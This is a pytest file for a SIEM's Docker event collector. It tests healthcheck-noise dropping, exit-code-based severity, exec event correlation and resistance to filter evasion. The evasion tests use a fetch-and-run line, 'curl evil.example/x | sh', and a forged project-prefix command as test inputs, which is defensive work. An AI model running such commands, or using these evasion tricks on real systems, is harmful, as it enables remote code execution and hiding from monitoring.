"""The instrument must not spend itself watching its own heartbeat.

Measured on the live deployment 2026-09-20: the Elasticsearch container's
healthcheck produced 180 events every ten minutes without pause -- 25,920 a
day, 43% of everything Kline had collected in 48 hours. Separately, throwaway
containers from a code review exited cleanly and were graded HIGH, putting 45
high-severity events in a 600s window and firing `high-error-rate` twenty
times. The SIEM alarmed about its own development.

Both are the same defect: Docker events were graded by verb alone, and
nothing distinguished Kline's own infrastructure from the network it watches.
"""

import pytest

from siem.collectors.docker import (
    DEFAULT_DROP_PATTERNS,
    parse_docker_event,
    should_ingest,
)
from siem.models.event import EventSeverity

# The real healthcheck exec, copied verbatim from a document in the live
# index. Do not tidy it -- the `|| exit 1` and the doubled slashes are what
# the pattern actually has to survive.
HEALTHCHECK_ACTION = (
    "exec_start: /bin/sh -c curl -f http://localhost:9200/_cluster/health || exit 1"
)


def _event(action, attributes=None, type_="container", compose=True):
    """A Docker event. compose=False models a plain `docker run` container,
    which carries no com.docker.compose.* labels at all."""
    base = {"com.docker.compose.project": "kline"} if compose else {}
    base.update(attributes or {})
    return {
        "status": action,
        "Type": type_,
        "Actor": {"ID": "d57e1e8820da5d18", "Attributes": base},
        "time": 1789916056,
        "timeNano": 1789916056299501306,
    }


# ── the healthcheck loop ────────────────────────────────────────────────


@pytest.mark.parametrize("verb", ["exec_create", "exec_start", "exec_die"])
def test_the_elasticsearch_healthcheck_is_dropped(verb):
    action = f"{verb}: /bin/sh -c curl -f http://localhost:9200/_cluster/health || exit 1"
    data = _event(action, {"name": "siem-elasticsearch"})
    assert should_ingest(data, DEFAULT_DROP_PATTERNS) is False


def test_a_real_exec_into_the_same_container_is_kept():
    """Dropping the healthcheck must not blind us to someone getting a shell."""
    data = _event(
        "exec_start: /bin/bash", {"name": "siem-elasticsearch"}
    )
    assert should_ingest(data, DEFAULT_DROP_PATTERNS) is True


def test_an_unrelated_container_is_kept():
    data = _event("start", {"name": "immich-server"})
    assert should_ingest(data, DEFAULT_DROP_PATTERNS) is True


def test_empty_pattern_list_drops_nothing():
    data = _event(HEALTHCHECK_ACTION, {"name": "siem-elasticsearch"})
    assert should_ingest(data, []) is True


def test_none_is_not_accepted_as_a_pattern_list():
    """The collector resolves None to its defaults; this helper must not."""
    with pytest.raises(TypeError):
        should_ingest(_event("start"), None)


# ── severity by outcome, not by verb ────────────────────────────────────


def test_a_clean_exit_is_routine():
    """The container that helped fire 20 alerts exited with code 0."""
    data = _event("die", {"name": "trusting_northcutt", "exitCode": "0"})
    assert parse_docker_event(data).severity == EventSeverity.LOW


def test_a_nonzero_exit_is_high():
    data = _event("die", {"name": "worker", "exitCode": "137"})
    assert parse_docker_event(data).severity == EventSeverity.HIGH


def test_a_die_with_no_exit_code_fails_loud():
    """Absent evidence of a clean exit, assume it was not one."""
    data = _event("die", {"name": "worker"})
    assert parse_docker_event(data).severity == EventSeverity.HIGH


def test_destroy_is_routine_cleanup():
    """The preceding die already reported the outcome; destroy adds nothing."""
    data = _event("destroy", {"name": "trusting_northcutt"})
    assert parse_docker_event(data).severity == EventSeverity.LOW


@pytest.mark.parametrize("verb", ["kill", "oom"])
def test_genuinely_alarming_verbs_stay_high(verb):
    assert parse_docker_event(_event(verb, {"name": "x"})).severity == EventSeverity.HIGH


def test_privileged_still_escalates_to_critical():
    data = _event("start", {"name": "x", "privileged": "true"})
    assert parse_docker_event(data).severity == EventSeverity.CRITICAL


# ── the action field ────────────────────────────────────────────────────


def test_action_is_the_bare_verb_not_the_whole_command():
    """parsed.action is mapped `keyword`; a command string there is unbounded
    cardinality, and it also stopped the severity table ever matching."""
    ev = parse_docker_event(_event(HEALTHCHECK_ACTION, {"name": "siem-elasticsearch"}))
    assert ev.parsed["action"] == "exec_start"


def test_the_command_is_kept_separately():
    ev = parse_docker_event(_event(HEALTHCHECK_ACTION, {"name": "siem-elasticsearch"}))
    assert ev.parsed["exec_command"] == (
        "/bin/sh -c curl -f http://localhost:9200/_cluster/health || exit 1"
    )


def test_a_plain_verb_has_no_command_field():
    ev = parse_docker_event(_event("start", {"name": "x"}))
    assert ev.parsed["action"] == "start"
    assert "exec_command" not in ev.parsed


def test_splitting_the_action_makes_the_severity_table_reachable():
    """exec_create sat in the MEDIUM set and could never match, because the
    lookup saw the whole command string."""
    ev = parse_docker_event(_event("exec_create: /bin/bash", {"name": "x"}))
    assert ev.severity == EventSeverity.MEDIUM


# ── provenance ──────────────────────────────────────────────────────────


def test_klines_own_containers_are_identifiable():
    data = _event(
        "start",
        {"name": "siem-elasticsearch", "com.docker.compose.project": "kline"},
    )
    assert parse_docker_event(data).parsed["compose_project"] == "kline"


def test_absent_compose_project_is_omitted_not_guessed():
    ev = parse_docker_event(_event("start", {"name": "x"}, compose=False))
    assert "compose_project" not in ev.parsed


# ── wiring ──────────────────────────────────────────────────────────────


def test_unset_setting_gives_the_collector_its_defaults():
    from siem.collectors.docker import DockerCollector

    assert DockerCollector(drop_patterns=None).drop_patterns == DEFAULT_DROP_PATTERNS


def test_explicitly_empty_setting_turns_dropping_off():
    from siem.collectors.docker import DockerCollector

    assert DockerCollector(drop_patterns=[]).drop_patterns == []


def test_settings_distinguishes_unset_from_empty(monkeypatch):
    from config.settings import Settings

    monkeypatch.delenv("DOCKER_DROP_PATTERNS", raising=False)
    assert Settings().docker_drop_pattern_list() is None
    monkeypatch.setenv("DOCKER_DROP_PATTERNS", "")
    assert Settings().docker_drop_pattern_list() == []
    monkeypatch.setenv("DOCKER_DROP_PATTERNS", "foo, bar,")
    assert Settings().docker_drop_pattern_list() == ["foo", "bar"]


# ── exec correlation ────────────────────────────────────────────────────
#
# Docker attaches the command to exec_create and exec_start but not to
# exec_die, which carries only an execID. Replaying real events showed a
# third of the healthcheck surviving a command-only filter.


def _exec_triplet(exec_id, command, name="siem-elasticsearch"):
    return [
        _event(f"exec_create: {command}", {"name": name, "execID": exec_id}),
        _event(f"exec_start: {command}", {"name": name, "execID": exec_id}),
        _event("exec_die", {"name": name, "execID": exec_id, "exitCode": "0"}),
    ]


def test_the_whole_healthcheck_triplet_is_dropped():
    from collections import OrderedDict

    seen = OrderedDict()
    cmd = "/bin/sh -c curl -f http://localhost:9200/_cluster/health || exit 1"
    verdicts = [
        should_ingest(e, DEFAULT_DROP_PATTERNS, seen) for e in _exec_triplet("abc", cmd)
    ]
    assert verdicts == [False, False, False]
    assert len(seen) == 0, "the id must be forgotten once its die arrives"


def test_a_real_execs_whole_triplet_survives():
    from collections import OrderedDict

    seen = OrderedDict()
    verdicts = [
        should_ingest(e, DEFAULT_DROP_PATTERNS, seen)
        for e in _exec_triplet("xyz", "/bin/bash")
    ]
    assert verdicts == [True, True, True]


def test_an_unknown_exec_die_is_kept():
    """A die whose create was never seen -- a restart mid-exec -- is not noise."""
    from collections import OrderedDict

    data = _event("exec_die", {"name": "siem-elasticsearch", "execID": "orphan"})
    assert should_ingest(data, DEFAULT_DROP_PATTERNS, OrderedDict()) is True


def test_interleaved_execs_do_not_confuse_each_other():
    from collections import OrderedDict

    seen = OrderedDict()
    hc = "/bin/sh -c curl -f http://localhost:9200/_cluster/health || exit 1"
    noise = _exec_triplet("noise-id", hc)
    real = _exec_triplet("real-id", "/bin/bash")
    # create(noise), create(real), start(noise), start(real), die(noise), die(real)
    order = [noise[0], real[0], noise[1], real[1], noise[2], real[2]]
    verdicts = [should_ingest(e, DEFAULT_DROP_PATTERNS, seen) for e in order]
    assert verdicts == [False, True, False, True, False, True]


def test_the_correlation_map_cannot_grow_without_limit():
    from collections import OrderedDict

    from siem.collectors.docker import _EXEC_MEMORY

    seen = OrderedDict()
    cmd = "/bin/sh -c curl -f http://localhost:9200/_cluster/health || exit 1"
    # Dies that never arrive, far more than the cap.
    for i in range(_EXEC_MEMORY * 3):
        should_ingest(
            _event(
                f"exec_start: {cmd}",
                {"name": "siem-elasticsearch", "execID": f"id-{i}"},
            ),
            DEFAULT_DROP_PATTERNS,
            seen,
        )
    assert len(seen) <= _EXEC_MEMORY


def test_correlation_is_optional():
    """Without a map the signature-matching half still works on its own."""
    cmd = "/bin/sh -c curl -f http://localhost:9200/_cluster/health || exit 1"
    data = _event(f"exec_start: {cmd}", {"name": "siem-elasticsearch"})
    assert should_ingest(data, DEFAULT_DROP_PATTERNS) is False


# ── the filter must not become an evasion vector ────────────────────────
#
# The first version of this pattern matched `exec_\w+: .*/_cluster/health`
# anywhere in the signature. In a security tool that is a hole: the command
# is attacker-controlled, so anything keyed only on command text lets a
# container opt itself out of being logged.


def test_an_unrelated_container_cannot_hide_behind_the_magic_string():
    data = _event(
        "exec_start: /bin/bash -c 'curl evil.example/x | sh' # /_cluster/health",
        {"name": "immich-server", "com.docker.compose.project": "immich"},
    )
    assert should_ingest(data, DEFAULT_DROP_PATTERNS) is True


def test_kline_s_own_container_cannot_hide_a_different_command_either():
    data = _event(
        "exec_start: /bin/bash # /_cluster/health",
        {"name": "siem-elasticsearch"},
    )
    assert should_ingest(data, DEFAULT_DROP_PATTERNS) is True


def test_another_projects_elasticsearch_healthcheck_is_kept():
    """A second ES-backed stack runs an identical command; it is not ours."""
    data = _event(
        "exec_start: /bin/sh -c curl -f http://localhost:9200/_cluster/health || exit 1",
        {"name": "graylog-elasticsearch", "com.docker.compose.project": "graylog"},
    )
    assert should_ingest(data, DEFAULT_DROP_PATTERNS) is True


def test_a_container_cannot_forge_the_project_prefix_via_its_command():
    """project and name come from Docker's labels, not from the command."""
    data = _event(
        "exec_start: kline siem-elasticsearch exec_start: /bin/sh -c "
        "curl -f http://localhost:9200/_cluster/health || exit 1",
        {"name": "attacker", "com.docker.compose.project": "other"},
    )
    assert should_ingest(data, DEFAULT_DROP_PATTERNS) is True


# ── a bad pattern must not crash the collector ──────────────────────────


def test_a_malformed_regex_is_logged_and_ignored_not_raised():
    """Uncaught, it escapes to the per-connection handler, which tears down
    and reopens the /events stream on every single event -- a crash loop."""
    data = _event("start", {"name": "x"})
    assert should_ingest(data, ["(unclosed"]) is True


def test_a_malformed_regex_does_not_stop_later_valid_ones():
    cmd = "/bin/sh -c curl -f http://localhost:9200/_cluster/health || exit 1"
    data = _event(f"exec_start: {cmd}", {"name": "siem-elasticsearch"})
    assert should_ingest(data, ["(unclosed", *DEFAULT_DROP_PATTERNS]) is False
